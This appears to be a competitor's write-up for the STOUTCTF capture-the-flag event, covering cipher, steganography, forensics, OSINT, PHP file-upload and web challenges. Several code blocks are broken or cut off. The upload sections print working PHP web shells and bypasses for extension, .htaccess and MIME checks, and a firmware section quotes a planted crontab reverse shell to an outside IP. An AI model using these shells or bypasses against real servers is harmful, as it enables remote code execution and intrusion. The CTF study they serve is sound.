Use the Giovan alphabet provided to you ABCDEFGHIJKLMNOPQRSTUVWXYZ|
Can you solve the great GIOVAN mystery?|
YBCPTPZN{EaT8CK2zVexEqjdCmP6URd14xW6kNg7B} | 
|---|


Searching for Giovan on Google revealed it was related to the Vigenère cipher, a method of encrypting text using a series of interwoven Caesar ciphers based on a keyword. It employs a polyalphabetic substitution technique, where each letter in the plaintext is shifted by a different amount depending on the corresponding letter in the keyword, creating a more complex and secure encryption compared to simple ciphers.Reading the text its highlight the ‘GIOVAN’ then it must be the key of it.

```bash
$echo "YBCPTPZN{EaT8CK2zVexEqjdCmP6URd14xW6kNg7B}" | python3 -c "import string; k='GIOVAN'; c=input().strip(); print(''.join([chr((ord(c.lower()) - ord(k[i % len(k)].lower()) + 26) % 26 + 97) if c.isalpha() else c for i, c in enumerate(c)]))"

### Hidden Waveforms

**Description** 
Hidden in the waves lies a secret. Can you find it?

Listening to the audio revealed a beeping sound, identified as Morse code. However, decoding it with online tools did not provide the expected flag or hint instead show ‘NOFLAGHERE…’. Furthering my steps. I also examining metadata using exiftool, inspecting the file with binwalk, and exploring potential steganography methods, but no significant findings emerged.

Upon testing the image with steghide, the file was extracted accidentally without requiring a password, revealing the data.

```bash
$steghide extract -sf hidden_waveforms.wav \
$cat secrets_in_sound.txt
43 43 43 43 43 43 43 43 43 43 91 62 43 62 43 43 43 62 43 43 43 43 43 43 43 62 43 43 43 43 43 43 43 43 43 43 60 60 60 60 45 93 62 62 62 43 43 43 43 43 43 43 43 43 43 43 43 43 46 43 46 45 45 45 45 45 46 43 43 43 43 43 43 46 45 46 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 46 62 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 46 60 43 43 43 46 62 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 46 60 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 46 60 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 46 62 45 45 45 45 45 45 46 62 45 45 45 45 45 46 60 45 45 45 45 45 45 45 45 45 45 46 62 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 45 46 46 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 46 60 60 45 45 45 45 45 46 62 62 45 45 45 45 45 45 45 45 45 45 45 45 45 45 46 60 43 43 43 43 43 43 43 43 43 46 43 43 43 43 43 43 43 43 43 43 46 60 43 43 43 43 43 46 62 45 45 45 46 62 45 45 46 60 45 45 45 45 45 45 45 45 45 45 45 45 45 45 46 60 45 45 45 46 62 62 43 43 43 43 43 46 60 46 43 43 46 62 45 45 45 45 45 45 45 45 45 45 45 45 45 45 46 43 43 43 43 43 43 43 46 46 43 43 43 43 46 60 45 45 45 45 45 45 45 46 60 43 43 43 43 46 45 45 45 45 45 45 45 46 62 62 45 45 46 43 43 43 43 46 45 45 45 45 46 43 43 43 43 46 60 60 43 43 43 43 43 43 43 46 62 62 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 46

### Custom Cipher

**Description** 
Your scripting cant break my encoding!
VWRXWFWI{Vr3J8NJks4Tn58PjDv3IPNc9VueGFwlu}

Initially, it seemed like the pattern resembled a Vigenère Cipher or something similar. Upon further analysis, it turned out to be ROT13, a simple substitution cipher that replaces each letter in the alphabet with the one 13 positions after it. This technique effectively rotates the alphabet by half its length, making it a straightforward yet effective method for obfuscation in certain contexts. Unlike Vigenère, which uses a keyword for encryption, ROT13 requires no key and can be easily change the rotating amount. In this case, the amount of the ROT13 was 23.

```bash
$echo "VWRXWFWI{Vr3J8NJks4Tn58PjDv3IPNc9VueGFwlu}" | tr 'A-Za-z' 'X-ZA-Wx-za-w'
STOUTCTF{So3G8KGhp4Qk58MgAs3FMKz9SrbDCtir}
```



### Fat Finger

**Description**
I seem to have fatfingered the file in transit... I should do more cardio!

This question, inspired by a similar challenge undertaken by my friend (shoutout to Armeyer), involves analyzing the QWERTY keyboard and applying a shift to the left for each letter, including both lowercase and uppercase characters. For example:
```
‘D’ shift to left turns into ‘S’
‘Y’ shift to left turns into ‘T’
‘P’ shift to left turns into ‘O’
```
```

```


### 13RottenTeRmites

I came across the flag while consistently using Ctrl + F on CyberChef. Eventually, I stumbled upon the string STOUTCTF, likely by coincidence. Guess its out of luck by any chance.

```
From Base64 > Rot13 (default amount of 13)
```

```bash
$cat 13RottenTeRmites.txt | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | grep "STOUTCTF"
STOUTCTF{qKp1MOJMDaJUIJ5KybLrcfZOFQ3IN1j2}
```



### Huffman

**Description**
Trees are very pretty. I like trees!

I was unfamiliar with Huffman encoding, so I looked it up and learned that it is a lossless data compression technique based on tree structures. So I made a script to decrypt based on the given file and decode it Huffman with node ‘1’ or ‘0’. This script implements Huffman coding for text compression and decompression. It uses a Node class to represent each character and its frequency in a binary tree. A Huffman tree is built using a priority queue (using heapq), where nodes with lower frequencies have higher priority. The generate_codes function creates a mapping of characters to binary strings based on the tree structure, assigning shorter codes to more frequent characters. The decode_huffman function reconstructs the original text from a binary string using the character-to-code mapping. This process encodes and decodes data by minimizing the average code length based on character frequencies.

```
import heapq
from collections import namedtuple

class Node:
    def __init__(self, weight, char, left=None, right=None):
        self.weight = weight
        self.char = char
        self.left = left
        self.right = right

    def __lt__(self, other):
        return self.weight < other.weight

def build_huffman_tree(frequency):
    priority_queue = []

    for char, freq in frequency.items():
        heapq.heappush(priority_queue, Node(freq, char))

    while len(priority_queue) > 1:
        left = heapq.heappop(priority_queue)
        right = heapq.heappop(priority_queue)
        merged = Node(left.weight + right.weight, None, left, right)
        heapq.heappush(priority_queue, merged)

    return priority_queue[0]

def generate_codes(node, prefix='', codebook={}):
    if node.char is not None:
        codebook[node.char] = prefix
    else:
        generate_codes(node.left, prefix + '0', codebook)
        generate_codes(node.right, prefix + '1', codebook)
    return codebook

def decode_huffman(encoded_string, codebook):
    reversed_codebook = {v: k for k, v in codebook.items()}
    decoded_string = ''
    current_code = ''

    for bit in encoded_string:
        current_code += bit
        if current_code in reversed_codebook:
            decoded_string += reversed_codebook[current_code]
            current_code = ''
    return decoded_string

frequency = {
    'co': 0.007352941176470588,
    'me': 0.007352941176470588,
    'e ': 0.01838235294117647,
    ' t': 0.01838235294117647,
    'to': 0.011029411764705883,
    'o ': 0.011029411764705883,
    #CONTINUE THE ARRAY GIVEN
}

huffman_tree = build_huffman_tree(frequency)
codebook = generate_codes(huffman_tree)

binary_string = (
    "0111011110110011111……………………"
)

decoded_text = decode_huffman(binary_string, codebook)
print(decoded_text)
```

```bash
$python script.py
Welcome to UW-Stout's CTF! I'm so happy you were able to decrypt this message. Was it hard? I'm not sure. I learned about this algorithm in one of my classes and thought it was cool...Anyways. Here is your flag:STOUTCTF{A0LZTvEW23NcbeKk8JyWJ8W0b6Mx7p6N}Congrats!
```




### Nothing To See Here

**Description:**
Seriously, what are you looking at?

The challenge involves decoding a file that appears empty but contains hidden encoded data using whitespace characters.I recognized the encoding as Whitespace language. Used the Whitespace decode tool on dcode.fr to decode the content. The result was in Base64 format. After that, The decoded Base64 output was again encoded in Whitespace language. Reused the Whitespace decode tool on dcode.fr, which revealed the final flag.

### 7 Bit Flow

**Description**
Computers see images much differently than we do. Can you see the bigger picture?

For this challenge, I tried everything, including checking the metadata, using steghide, and running binwalk, but I couldn’t figure out what to do. Then I reread the question, which mentioned '7-bit' Taking a chance, I created the script to process RGB values using 7-bit, and it worked.

```
from PIL import Image
import numpy as np

img = Image.open("bit_flow.jpg").convert("RGB")
width, height = img.size

pixels = np.array(img)

ch_channel = pixels[:, :, 0]

# Extract bit 7 (MSB)
bit_plane_7 = (ch_channel >> 7) & 1

text_output = []
for row in bit_plane_7:
    bits = "".join(map(str, row))
    chars = [chr(int(bits[i:i + 8], 2)) for i in range(0, len(bits), 8)]
    text_output.append("".join(chars))

for line in text_output:
    print(line)
```

```bash
$python decode.py | head -n 1
STOUTCTF{7jDcMSX5lqCCM6wxr7ijiTSUXRz0LiiU}
```


## Forensics
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Normal Image

If we cannot see anything inside the image, metadata or hidden compressed file inside the image. Try to see if zsteg any uses.

Using zsteg:
```bash
$ zsteg StoutxUniKL.png | head -n 2
b1,g,msb,xy         .. file: OpenPGP Secret Key
b1,rgb,lsb,xy       .. text: "STOUTCTF{1ywHGox1ZRNcAftHt1CWP9YT1PKT1inR}"
```




### Iera Milpan

**Description**
Waktu bahagia berkasih Muncul sesuatu tak ku duga Lilin selama ini bernyala Terpadam gelap gelita Sukarnya untuk melupakan Ikatan janji setia Di bawah pohon asmara Kau lafazkan Mentera cinta Retak hatiku hancur semua Diriku ini jiwa meronta Cinta yang sudah pudar Tenggelam di lautan kecewa Walau hati akan kekosongan Namun cintaku bukan mainan Biarlah aku bersendirian Untuk melupakanmu Biarkanlah aku Membawa diriku Semoga bahagia Walau ku berduka Walau patah tumbuh Hilangkan berganti Namun luka ini Sukar diubati Retak hatiku hancur semua Diriku ini jiwa meronta Cinta yang sudah pudar Tenggelam di lautan kecewa Walau hati akan kekosongan Namun cintaku bukan mainan Biarlah aku bersendirian Untuk melupakanmu oh Biarkanlah aku Membawa diriku Semoga bahagia Walau ku berduka Walau patah tumbuh Hilangkan berganti Namun luka ini Sukar diubati Biarkanlah dia Membawa dirinya Semoga bahagia Walau kau berduka Walau patah tumbuh Hilangkan berganti Namun luka ini Sukar diubati

File was actually an png not in mp3
```bash
$ file Retak_Hatiku_-_Iera_Milpan.mp3
Retak_Hatiku_-_Iera_Milpan.mp3: PNG image data, 1219 x 48, 8-bit/color RGBA, non-interlaced
```

Changing the extension of mp3 into png
```bash
$ cp Retak_Hatiku_-_Iera_Milpan.mp3 image.png
```

Open up the image. and you'll get to see the flag

### RockYou

**Description**
Don't crack your zipper!

Use john tools to crack the password with the wordlist of Rockyou.txt. Command:
```bash
$ Zip2john RockYou.zip > hash
$ John –-wordlist=/usr/share/wordlists/rockyou.txt hash
$ Unzip RockYou.zip
$ Cat Flag.txt
STOUTCTF{wxxD6DH2c4yyeKhoXKvz7W8NrRUb4b1J}
```





### The Echoes

Filter icmp with the Echo (ping) reply only with the query of :
``icmp.type==0``

We can save the data Export as csv or simply use command. 

Use commandline to extract
Using command extracts the data information from a network capture file. It filters for specific ICMP packets (type 0), picks out certain data fields, and processes them step by step. First, uses tshark to read the file and extract the relevant data. Then, awk selects and formats parts of the data. The processed data is converted back to binary using xxd.

```bash
$ tshark -r TheEchos.pcap -Y "icmp.type == 0" -T fields -e data | awk 'NF {print substr($0, 1, 2)}' ORS='' | xxd -r -p 
```

Grep the flag
Reading through file there is actually ‘STOUTCTF’. We can grep it for the specific text that we want.

```bash
$ tshark -r TheEchos.pcap -Y "icmp.type == 0" -T fields -e data | awk 'NF {print substr($0, 1, 2)}' ORS='' | xxd -r -p | grep -o 'STOUTCTF{[^}]*}'
STOUTCTF{fZtPEj720e1OKFrQPqouICBdgVAtD14N}
```





### Dark Web Firmware 1


Extracting the file and running a string search yielded no results. I then checked the file headers for any clues and found one unfamiliar file. Upon investigating, I discovered it was labeled 'filesystem.squash.' A quick Google search revealed it to be a SquashFS filesystem, prompting further research into its structure and extraction methods. Some good material to read: `https://www.mankier.com/1/unsquashfs`

Extracting filesystem using squashfs

```bash
$ unsquasfs filesystem.squashfs
```

Getting the extraction we can use Regex to display all IPs.
```bash
$ sudo grep -orE '([0-9]{1,3}\.){3}[0-9]{1,3}' .
```
One look suspicious with the name of ‘kali’
```
./etc/crontabs/kali:109.23.44.78
```
Reading through the ``./etc/crontabs/kali`` can see the tcp was made with the ip on reboot.


### Dark Web Firmware 2

Even though we already know its kali. To double confirm it, im trying to read the ``./etc/passwd`` if the user was exactly exist and yes, it was exist.

Reading the ``/etc/crontab/kali``
```bash
$ cat ./etc/crontabs/kali
@reboot (echo '* * * * * bash -i >& /dev/tcp/109.23.44.78/9989 0>&1' | crontab -)
```

Reading the ``/etc/passwd``
```bash
$ cat ./etc/passwd | tail -n 3
admin:x:1000:0:admin:/var:/bin/false
guest::2000:65534:guest:/var:/bin/false
kali:x:0:0:root:/root:/bin/ash
```




### Dark Web Firmware 3

Use regex of url pattern.
```bash
$grep -Er "http://[a-zA-Z0-9.-]+\.com" . | grep -v "www.tp-link.com"
```
The index.html will keep refresh on the tinyurl[.]com . The URL also a bit different compared to other URL.

Decode BASE64
Trying to decode the Flag. It was just a rabbit hole. Then we need some way or keys to uncover the UUID gibberish cipher.
```bash
$ echo NGUgNjkgNjMgNjUgMjAgNzQgNzIgNzkgMmMgMjAgNjUgNzggNzAgNmMgNmYgNzIgNjUgNzIgMjEgMjAgNDIgNzUgNzQgMjAgNzQgNjggNjUgMjAgNzQgNzIgNzUgNjUgMjAgNzQgNzIgNjUgNjEgNzMgNzUgNzIgNjUgNzMgMjAgNmYgNjYgMjAgNzQgNjggNjUgMjAgNDUgNzQgNjUgNzIgNmUgNjEgNmMgMjAgNGUgNjEgNzYgNjkgNjcgNjEgNzQgNmYgNzIgMjAgNzIgNjUgNmQgNjEgNjkgNmUgMjAgNjggNjkgNjQgNjQgNjUgNmUgMmUgMjAgNGIgNjUgNjUgNzAgMjAgNzMgNjUgNjUgNmIgNjkgNmUgNjcgMmMgMjAgNjEgNmUgNjQgMjAgNzkgNmYgNzUgMjAgNmQgNjkgNjcgNjggNzQgMjAgNmEgNzUgNzMgNzQgMjAgNzUgNmUgNjMgNmYgNzYgNjUgNzIgMjAgNzQgNjggNjUgNjkgNzIgMjAgNzMgNjUgNjMgNzIgNjUgNzQgNzMgMmU= | base64 -d | xxd -r -p
Nice try, explorer! But the true treasures of the Eternal Navigator remain hidden. Keep seeking, and you might just uncover their secrets.
```

Decoding UUID

### Orb of light

**Description**
Dr. Elana Markov sat hunched over her desk, the flickering light of a small monitor casting shadows across the cluttered lab. The coordinates had come from a crumbling fragment of an old text—a discovery that many dismissed as mere legend. But Markov knew better.
She had just returned from the coordinates after finding a ominous video, her breath catching as grainy, footage filled the screen. The camera, sat motionless watched an endless, icy expanse, the snow creating a dense fog in the distance she watched and watched trying to find something, anything to give her a clue of what this was, she knew something was off.
As she watched the video over and over she realized there must be another part of the video, she must be missing something. She returned to the site and found a note hidden under piles of rubble with the same ancient cipher as before.
Hours later, she had deciphered the beginning of the hidden message within the light. It was fragmented, incomplete:
“To find the truth, follow...”
She pushed on looking everywhere for anymore clues to what this might mean. After searching high and low she discovered a hidden compartment with a cryptic note, the beginning looked familiar, the same as before, but this one was complete "To find the truth, follow... ``wkh ruev ri oljkw, wkhb iolfnhu lq d suhglfwdeoh sdwwhuq, wkhb zloo ohdg brx wr Wkh Hwhuqdo Qdyljdwru. Wkh sdvvzrug brx vhhn lv rue5riO1jkw``"
With this, she knew what she needed to do.


Decoding the hint from description
I received a zip file with a password and needed to find a clue. The description contained some encrypted text, which I decoded using ``ROT13``. This revealed the password. ``orb5ofL1ght``

Unzip it with the password we're getting. After unzip it. I’m getting the .mp4 video and looks it out. Open up the video With a quick reaction and sharp eyes. I we can see some blinking on the corner left. There was morse code. 

Decoding the morse code
Decode it one by one using any video tools will help a lot.
```

```
After Getting the dots. We can get final flag.

### Substitute Teacher
The hint referenced '1992' and '45 Rogue', which pointed to Base92 and Base45 encoding. The process involved: ``Gunzip > Base92 > Base45 > Gunzip``. After following these steps, plaintext wording was revealed, allowing me to proceed with downloading and ``saving the file``.

Checking the file type. It was pcap.
```bash
$ file file.txt
file.txt: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

Rename the extension into pcap
```bash
$ cp file.txt new.pcap
```

#### TCP

We found the Keyword of ``Upper``

Upper WSCZMQHNUFBLIDEPJOYTRVXAKG
```

#### UDP

Now as we know the keyword ``Upper`` exist. seeing the pattern was all alphabet, im using the UDP keyword to look any alphabet only consist in the pcap of UDP.
```bash
$ tshark -r new.pcap -Y "udp" -T fields -e udp.stream -e data | grep -Pv '^\s*$' | cut -f2 | while read hex; do echo $hex | xxd -r -p | grep -Pv '[0-9]'; done
Lower amuphvibojrtfzwnqyeclxkdgs
```


#### Decrypting Evidence
After spending considerable time analyzing the encoded text and reviewing the description and hints, I began to understand that the process involved mapping encoded letters and numbers back to their original forms. The cipher relied on meticulous precision, where every detail—whether uppercase or lowercase—was important. For instance, the capital letter ``'Y'`` in the encoded text corresponds to ``'S'`` in the original mapping. Similarly, the capital ``'T'`` remains ``'T'`` after decoding, as observed when comparing the ciphered and standard alphabets. Made a script out of it to decode it.

```
upper_cipher = "WSCZMQHNUFBLIDEPJOYTRVXAKG"
lower_cipher = "amuphvibojrtfzwnqyeclxkdgs"

standard_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
standard_lower = "abcdefghijklmnopqrstuvwxyz"

numeric_key = "9085346217"

encoded_text = "YTERTCTQ{M1KyJDS6fXaU8PHzuKjSBHrgs5gt1Uhu}"

def decode(encoded, upper_map, lower_map, num_map):
    result = []
    for char in encoded:
        if char in upper_map:
            index = upper_map.index(char)
            result.append(standard_upper[index])
        elif char in lower_map:
            index = lower_map.index(char)
            result.append(standard_lower[index])
        elif char in num_map:
            index = num_map.index(char)
            result.append(str(index))
        else:
            result.append(char)
    return ''.join(result)

flag = decode(encoded_text, upper_cipher, lower_cipher, numeric_key)
print(flag)
```

I Googled to find out what kind of encoding uses Chinese characters and discovered it was Base 65536. I found a cool website to decode it and proceeded with the process: ``https://www.better-converter.com/Encoders-Decoders/Base65536-Decode``

After pasting the encoded text, I noticed more encoded characters with a pattern similar to Base64. I immediately decoded it using CyberChef, where the magic features suggested a file type detection. It turned out to be an image, indicating that the additional encoded text was actually within the image.


Given my experience with pixel-based encoding from multiple CTFs, I decided to try my first method to extract the color codes. I wrote a script to automate the process, allowing me to decode the information efficiently.

```
color_codes = [
    "#53544F", "#555443", "#54467B", "#327147", "#6E4A50",
    "#61336F", "#6A4966", "#4C5275", "#776D75", "#6E6967",
    "#52686F", "#313976", "#336A63", "#61397D"
]

def hex_to_chars(hex_code):
    hex_code = hex_code.lstrip('#')
    chars = []
    for i in range(0, len(hex_code), 2):
        hex_pair = hex_code[i:i+2]
        chars.append(chr(int(hex_pair, 16)))
    return ''.join(chars)

decoded_values = [hex_to_chars(code) for code in color_codes]
print(decoded_values)
```

```bash
$ python solver.py

### Abandoned Airwaves

**Description**
Can you find when sunset will be at the location on the date of December 16th 2024?

Flag format: hour:minute in 24 hour time


Performing a reverse image search on Google, I discovered that the image was associated with a stock photo or had been posted by someone else. This led me to identify the location as the Duga-1 Station.

``Duga-1 Station``


### Abandoned Airwaves pt.2

Check through this site: https://www.timeanddate.com/sun/ukraine/chernobyl

The sunset time was between 51-54 hence the answer was actually 15:52

``15:52``

### Last Known Location


Did the Reverse image search. After seeing similar image on the google map I just copy the lat and long on the URL.

## PHP File Upload
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### File Upload Level 1



This line moves the uploaded file to a user-specific directory. Since the code doesn't check the file type or content, an attacker can upload a PHP script (e.g., shell.php). Once uploaded, we can access and execute the file, resulting in RCE.

```
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: application/octet-stream

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

| URL: | 
|---|
/upload/1db3f1ef4316fe0f2227c63aaeb6ea1a/s.php?cmd=cat+%2Fflag.txt | 
|---|

```
STOUTCTF{rxM14VXNjhH0L6KM9VHMzpIVAKzzxHOq}
```


### File Upload Level 2



There's a check that prevents uploading files with a ``.php`` extension ``(if ($extension === "php"))``, this doesn't fully protect against other attack vectors like uploading files with double extensions (e.g., malicious.php.jpg) or files that contain PHP code. In this example I’ll use ``.phar`` as extension



Getting into the File that uploaded:

```
Content-Disposition: form-data; name="file"; filename="a.phar"
Content-Type: application/octet-stream

<?=`$_GET[0]`?>
```

| URL: | 
|---|
/upload/badef61be6423b1f2f550038d89c96eb/s6.phar?0=cat%20/flag.txt | 
|---|

```
STOUTCTF{aXVwCHhPilsCGBZmtbrcYsilsq1fWbnD}
```

### File Upload Level 3

Similar approach from the PHP2
```
Content-Disposition: form-data; name="file"; filename="s6.phar"
Content-Type: application/octet-stream

<?=`$_GET[0]`?>
```

| URL: | 
|---|
/upload/27d04fd09ea24a9502fbfcccae491cf6/s6.phar?0=cat%20/flag.txt | 
|---|

```
STOUTCTF{HUgYrh4ZK7a1Ztk8PQRsE843mPv1GxPn}
```

### File Upload Level 4

The code now checks that the file extension is not php, phtml, or phar:
In this challenge, PHP extensions are filtered, but ``.htaccess`` files are not. By uploading a ``.htaccess file``, we can configure the server to execute files with custom extensions as PHP.
Create an .htaccess file with the following content to map a custom file extension to PHP:

This configuration tells the server to treat files with the .lol extension as PHP scripts.

```
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: application/octet-stream

AddType application/x-httpd-php .lol
```

After uploaded, apply ``another upload`` for your reverse shell. 

```
Content-Disposition: form-data; name="file"; filename="rce.lol"
Content-Type: application/octet-stream

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> 
```

Once the .htaccess and rce.lol files are uploaded, you can execute commands on the server using the rce.lol script by passing the desired command as a query parameter. This method allows you to interact with the server.

| URL: | 
|---|
/upload/4f6b5be1f06415ae5879e9e473e539b0/rce.lol?cmd=cat%20/flag.txt | 
|---|

```
STOUTCTF{ElEq5VtDJ4ANFkrUqkaUBQveLHai0ju0}
```

### File Upload Level 5


While this restricts file uploads to certain image types, this check can be bypassed. ``MIME type validation can be spoofed`` because the MIME type is sent by the client (the browser), and an attacker could modify it to upload a non-image file, like a PHP script. We can craft a file that looks like an image (e.g., image.php) but contains executable PHP code inside. By sending ``image/png`` to ``Content-Type`` while keeping the filename type as ``.php`` we still can execute it just fine

```
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: image/png

<?=`$_GET[0]`?>
```

| URL: | 
|---|
/upload/94f604168ed1bbfd7afac8cef30e7a68/a.php?0=cat+/secret.txt | 
|---|

```
STOUTCTF{W2v1JvVzCBecumPT1LJEn15xvPIN1Hi}
```


### File Upload Level 6


The code uses ``finfo_file()`` to check the MIME type of the file, which relies on reading the file's ``magic bytes`` to identify the file's content type:

The MIME types are then validated against a whitelist of acceptable image types ``image/jpeg, image/png, image/gif``

We can craft a malicious file that looks like an image based on its magic bytes but is actually a PHP file.
```
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: application/octet-stream

//MAGIC BYTES OF IMAGE//
<?=`$_GET[0]`?>
```
This could upload a file that starts with valid image magic bytes (e.g., JPEG magic bytes 0xFF 0xD8), but contains PHP code afterwards. This would pass the MIME type check because it starts with valid image magic bytes, yet still contains PHP code that could be executed if the file is accessed.

| URL: | 
|---|
/upload/3214a2de76e797138193b18b365cb558/file.php?0=cat%20/flag.txt |

Reading through this line on the given ``Decode.py`` see the encoded uses Blowfish hence we can decode it by scripting or directly use cyberchef for convenience. The i.txt and k.txt must be convert from base64 first the put the Hex value on the details.
``c = Blowfish.new(k, Blowfish.MODE_CBC, i)``

```
from Crypto.Cipher import Blowfish

What strange encoding. Can you decipher it to get the flag?

```bash
$ cat Who_Said_30.dat

We want to text only the base64 encoded. can use this command:
```bash
$ strings Who_Said_30.dat | grep -oP ‘(?<=\|)[^|]+(?=\|)’ | base64 -d > text.txt
```

Then decode base64 many times until get the flag using ``base64 -d``.

```bash
$ cat text.txt | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d

### Cost of Gas
**Description**
The cost of gas is insane! Can you believe node traversal is so expensive? I wish I had some sort of map or matrix describing the cheapest cost to any node from any node...
NodeA -> NodeC 32324
NodeB -> NodeA 26786
NodeC -> NodeB 77458 NodeC -> NodeD 19905 NodeC -> NodeG 19455
NodeD -> NodeA 64678 NodeD -> NodeE 57878
NodeE -> NodeF 29999 NodeE -> NodeA 82356
NodeF -> NodeC 77777 NodeF -> NodeA 33333 NodeF -> NodeD 88888 NodeF -> NodeG 88888
NodeG -> NodeA 1
Example submission: A -> B 1 B -> A 1
Resulting matrix: A B A 0 1 B 1 0
THIS IS WHAT YOUR FLAG SHOULD LOOK LIKE: STOUTCTF{0110}
•	No spaces
•	One line
•	No letters



Given a list of node-to-node travel costs and asked to create a matrix that shows the cheapest cost between each pair of nodes. The goal is to process the provided distances and find the minimum cost for each pair. For example, if traveling from NodeA to NodeB costs 1 and from NodeB to NodeA costs 1, the matrix will show these values. Creating a script must be done to calculates the shortest travel costs between nodes using the Floyd-Warshall algorithm. First, it initializes a distance matrix with "infinity" to represent unconnected paths, then sets the diagonal to 0, as the cost to travel from a node to itself is zero. Then populates the matrix with the provided edge costs between nodes. After that, the algorithm iterates through each pair of nodes, updating the distance matrix to reflect the shortest paths by considering each intermediate node. Finally, converts the matrix into a continuous string of integers representing the minimum costs between all nodes and prints the result.


```
import numpy as np

edges = {
    'A': {'C': 32324},
    'B': {'A': 26786},
    'C': {'B': 77458, 'D': 19905, 'G': 19455},
    'D': {'A': 64678, 'E': 57878},
    'E': {'A': 82356, 'F': 29999},
    'F': {'C': 77777, 'A': 33333, 'D': 88888, 'G': 88888},
    'G': {'A': 1}
}

nodes = list(edges.keys())

n = len(nodes)
distance_matrix = np.full((n, n), float('inf'))  # Start with "infinity"

for i in range(n):
    distance_matrix[i][i] = 0

for src in edges:
    for dest in edges[src]:
        distance_matrix[nodes.index(src)][nodes.index(dest)] = edges[src][dest]

for k in range(n):
    for i in range(n):
        for j in range(n):
            if distance_matrix[i][j] > distance_matrix[i][k] + distance_matrix[k][j]:
                distance_matrix[i][j] = distance_matrix[i][k] + distance_matrix[k][j]

output = ""
for i in range(n):
    for j in range(n):
        output += str(int(distance_matrix[i][j]))

result = f"STOUTCTF{{{output}}}"
print(result)

Given the original perl code:
```
#!/usr/bin/perl
use strict;
use warnings;

# Welcome message
print "Generating a super random CTF flag";

# Get the current time as a seed
my $seed = time;

# Seed the random number generator
srand($seed);

# Define a function to generate a super dupper advanced and secure random string
sub random_string {
    my ($length) = @_;
    my @chars = ('a'..'z', 'A'..'Z', '0'..'9');
    my $random_string = '';

    for (1..$length) {
        $random_string .= $chars[int(rand(@chars))];
    }

    return $random_string;
}

# Generate the flag
my $flag = "STOUTCTF{" . random_string(16) . "}";

# Print the generated flag
print "Generated Flag: $flag\n";
```

we can see the ``hash.txt`` said ``Generated at 21:55-22:00 CST on 12/17/24``. we can use the time to generate the seed with that time

```
#!/usr/bin/perl
use strict;
use warnings;
use Digest::SHA qw(sha256_hex);

my $target_hash = "00ac7414402727fdf04c16b5dd7eb54533f459ff1943905e3e3143388e9460da";

my $start_time = 1734515700; # 21:55 CST
my $end_time = 1734516000;   # 22:00 CST

sub random_string {
    my ($seed, $length) = @_;
    srand($seed);
    my @chars = ('a'..'z', 'A'..'Z', '0'..'9');
    my $random_string = '';
    for (1..$length) {
        $random_string .= $chars[int(rand(@chars))];
    }
    return $random_string;
}

for my $seed ($start_time..$end_time) {
    my $random_str = random_string($seed, 16);
    my $flag = "STOUTCTF{" . $random_str . "}";

    my $hash = $flag;
    for (0..65) {
        $hash = sha256_hex($hash);
        if ($hash eq $target_hash) {
            print "$flag\n";
            last;

### Keyboard hackers
**Description**
My hacker friend gave me this file saying that he hacked my keyboard. I have no idea what he means. Can you make sense of this file?


This packet capture (PCAP) shows the communication between a USB Human Interface Device (HID) and the host system. The captured data includes the exchange of HID reports, which are the primary method for transmitting input data such as keystrokes or mouse movements between the device and the computer. Example the image shown below.


Filter: ``usb.src==”1.1.1”``

HID devices communicate by sending packets that contain data in specific report formats. These packets are transmitted using periodic transfer types and are typically acknowledged by the host system. Hence we can put it in column to see the HID Data. ``Right Click on HID Data > Apply as Column``

Now we can see the HID Data on the column. ``Save as CSV`` .Name to anything you like example ‘key’

Copy the ``HID Data only`` and save it in ``.txt``For the script. I’m using the script getting from this: ``https://blog.stayontarget.org/2019/03/decoding-mixed-case-usb-keystrokes-from.html``

```bash
$ python solver.py hidcap.txt
hello hope you can get this flag:) stoutctf{by3yfbitp3vs1ecx6ery}good luck
```






## Web
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
### Nuclear Codes


Checking the request using ``burp suite`` and checking the direction of the web we can see ``codec.php`` was being loaded without we see anything. On the Response of the codec.php in the section of ``launch-code``. There's flag. or we can use Curl to obtain it. or alternative way was fuzzing.

```bash
$ curl https://ctf.oplabs.us/web/NuclearCodes/codes.php | grep "STOUT"
    <p class="launch-code">Launch Code: <span>STOUTCTF{vkU8yXCSxZtY9YrhMzyaUSoWVHapVF84}</span></p>
```


### PharmaNet

This time it’s a common SQL injection. Starting with a basic payload of sql injection. (Can refer my favorite cheat sheet: ``https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/README.md`` )

SQL injection happens because of improper handling of user inputs within SQL queries. It occurs when user-supplied data is directly inserted into SQL statements without proper validation or sanitization, allowing attackers to manipulate the query structure.

Example Before:
```
